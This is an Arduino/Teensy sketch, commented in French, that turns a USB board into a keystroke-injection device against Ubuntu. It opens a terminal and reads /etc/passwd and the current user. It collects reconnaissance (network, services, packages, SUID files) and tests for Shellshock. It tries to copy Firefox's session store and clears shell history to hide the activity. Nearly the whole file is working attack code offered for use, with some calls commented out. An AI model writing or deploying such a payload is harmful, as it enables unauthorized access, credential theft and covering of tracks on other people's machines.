/* 
 *  Ce fichier contient un code pour la récupération des données sous Linux Ubuntu 18.04.2 LTS
 *  Types des données :
 *  - Mots de passe
 *  - Information sur le système
 *  - Identifiants et mots de passe stockés dans Mozilla Firefox(Facultatif)
*/
#include <Keyboard.h>
// Teensy 2.0 has the LED on pin 11
// Teensy++ 2.0 has the LED on pin 6
// Teensy 3.x / Teensy LC have the LED on pin 13
const int ledPin = 13;

// Cette fonction sert pour la récupération des informations sur le système
void gathering(){
  
  Keyboard.print("echo 'Logged in user: ' $USER > info_gathering.txt \n");
  delay(1000);
  Keyboard.print("echo -n 'Distribution Kernel Version: ' >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("cat /etc/issue | cut -c1-13 >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("echo -n 'uname results: ' >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("uname -a >> info_gathering.txt  \n");
  delay(1000);
  Keyboard.print("echo 'Shellsock Bug Vulnerability: ' >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("env x='() { :;}; echo vulnerable' bash -c 'echo this is a test' >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("echo 'Mounted filesystems: ' >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("mount -l >> info_gathering.txt  \n");
  delay(6000);
  Keyboard.print("echo 'Network Configuration:' >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("ifconfig -a | grep 'Link\|inet' >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("echo 'Print Hosts: ' >> info_gathering.txt \n"); 
  delay(1000);
  Keyboard.print("cat /etc/hosts >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("echo 'Print ARP: ' >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("arp >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("echo 'Development tools availability: ' >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("which gcc >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("which python >> info_gathering.txt  \n");
  delay(1000);
  Keyboard.print("echo 'Print TCP/UDP Listening Services: ' >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("netstat -tunlpe >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("echo 'Installed Packages: ' >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("dpkg -l >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("echo 'Find Readable Folders in /etc: ' >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("find /etc -user $(id -u) -perm -u=r -o -group $(id -g) -perm -g=r -o -perm -o=r -ls 2> /dev/null >> info_gathering.txt \n");
  delay(5000);
  Keyboard.print("echo 'Find SUID and GUID files' >> info_gathering.txt \n");
  delay(1000);
  Keyboard.print("find / -type f -perm -u=s -o -type f -perm -g=s -ls  2> /dev/null >> info_gathering.txt  \n");
  delay(5000);
  Keyboard.print("cat info_gathering.txt \n");
  delay(5000);
  //Supprimer l'historique des commandes
  Keyboard.print("history -c \n");
  delay(1000);
  }

//Fonction pour la récupération des mots de passe dans Firefox
void info_firefox(){
  Keyboard.print("firefox\n");
  delay(15000);
  Keyboard.print("about:preferences#privacy");
  delay(3000);
  Keyboard.press(KEY_ENTER);
  //delay(1000);
  Keyboard.releaseAll();
  //delay(1000);
  Keyboard.print("saved logins");
  delay(1000);
  //Keyboard.press(KEY_ENTER);
  //delay(1000);
  //Keyboard.releaseAll();
  //Keyboard.press(KEY_TAB);
  //delay(1000);
  //Keyboard.releaseAll();
  /*
  for(int i=0; i<4; i++){
    Keyboard.press(KEY_TAB);
    delay(1000);
    Keyboard.releaseAll();
  }*/
  //delay(300);
  //Keyboard.press(KEY_ENTER);
  //delay(500);
 // Keyboard.releaseAll();
  //delay(100);
  //Récupération des données depuis le terminal
  Keyboard.print("cd ~/.mozilla/firefox/so81oktj.default");
  delay(1000);
  Keyboard.print("cat sessionstore.jsonlz4 >> logs_firefow.txt\n");
  delay(1000);
  }
  
void setup() {
  // initialize the digital pin as an output.
  pinMode(ledPin, OUTPUT);
  Serial.begin(9600); // USB is always 12 Mbit/sec
  Keyboard.begin();

  //loop
  delay(5000);
  digitalWrite(ledPin, HIGH);
  delay(2000);
  //Ouvrir le terminal
  Keyboard.press(KEY_LEFT_CTRL);          
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  // Récupération des mots de passe et l'utilisateur courant
  Keyboard.print("id \n");
  delay(1000);
  Keyboard.print("echo 'Logged in user: ' $USER >> logs_linux.txt \n");
  delay(1000);
  Keyboard.print("cat /etc/passwd >> logs_linux.txt\n");
  delay(1000);
  Keyboard.print("cat logs_linux.txt\n");
  delay(300);
  //Appel de la fonction gathering
  //gathering();
  //Supprimer l'historique des commandes
  Keyboard.print("history -c \n");
  digitalWrite(ledPin, LOW);
  delay(1000);
  Keyboard.end();
}

// the loop() method runs over and over again,
// as long as the board has power
//int number = 1234;
void loop(){
  }
